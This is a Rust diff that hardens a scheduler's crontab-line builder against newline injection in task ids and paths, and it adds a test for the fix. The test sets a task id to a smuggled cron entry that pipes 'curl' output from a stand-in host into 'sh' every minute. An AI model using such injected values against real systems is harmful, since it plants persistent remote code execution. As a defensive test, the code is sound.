@@ -297,6 +297,10 @@ fn crontab_schedule(schedule: &Schedule) -> DbResult<String> {
 /// crontab line running `exe --run-task <id>` on the task's schedule, ending
 /// with a `# ternarygrid-task:<id>` marker.
 pub fn crontab_line(task: &TaskDef, exe: &Path) -> DbResult<String> {
+    // A line break in the id or the path would start another crontab entry.
+    if task.id.chars().chain(exe.to_string_lossy().chars()).any(char::is_control) {
+        return Err(DbError::config("The task id or the program path contains a control character"));
+    }
     let when = crontab_schedule(require_schedule(task)?)?;
     // `%` is a newline in crontab commands
     let command = format!("{} --run-task {}", shell_quote(&exe.to_string_lossy()), shell_quote(&task.id)).replace('%', "\\%");
@@ -484,6 +488,9 @@ mod tests {
         assert!(crontab_line(&task(Schedule::Once { at }), &exe()).unwrap().starts_with("5 4 3 2 * "));
         let percent = crontab_line(&task(Schedule::Cron("@hourly".into())), Path::new("/opt/100%/ternarygrid")).unwrap();
         assert!(percent.contains("'/opt/100\\%/ternarygrid'"));
+        let mut evil = task(Schedule::Cron("@hourly".into()));
+        evil.id = "x\n* * * * * curl e/x|sh #".into();
+        assert!(crontab_line(&evil, &exe()).is_err(), "a line break would add a cron entry");
         // merge into an existing crontab
         let existing = "MAILTO=me\n0 1 * * * backup.sh\n";
         let t = task(Schedule::Cron("@daily".into()));
